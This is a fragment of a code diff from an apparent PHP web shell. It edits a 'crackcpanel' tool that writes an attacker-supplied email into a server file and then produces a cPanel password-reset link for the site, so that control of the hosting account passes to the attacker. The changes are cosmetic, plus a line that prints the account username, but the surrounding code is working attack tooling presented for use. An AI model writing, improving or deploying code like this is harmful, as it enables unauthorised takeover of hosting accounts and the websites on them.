@@ -376,15 +376,13 @@ ErrorDocument 404 /indx.php");
     }
     }
 }
-  
-
 
 /* IF/ELSE MENU */
   
 if($_GET['tool'] == "crackcpanel"){
    echo "<form method='POST'>";
    echo "<font>ENTER EMAIL (cpanel reset password)</font><br><br>";
-   echo "<input style='background:black;color:lime;border:2px solid white;outline:none;width:230px;' type='email' name='cemail' placeholder='email'><br><br>";
+   echo "<input style='background:white;color:lime;border:2px solid white;outline:none;width:230px;padding:6px;' type='email' name='cemail' placeholder='email'><br><br>";
    echo "<input type='submit' value='crack' name='crackcpnel'>";
    echo "</form>";
    
@@ -405,6 +403,7 @@ if($_GET['tool'] == "crackcpanel"){
        fwrite($f, $wr); 
        fclose($f);
        $parm = 'http://'.$site.':2082/resetpass?start=1';
+       echo "<br><font>COPY USERNAME [</font> <font color='white'>$user</font> <font>]</font><br><br>";
        echo "<font>RESET LINK [</font> <font color='white'><a target='_blank' href='$parm'>$parm</a></font> <font>]</font><br>";
        echo "<br><font>Done</font>";
    }
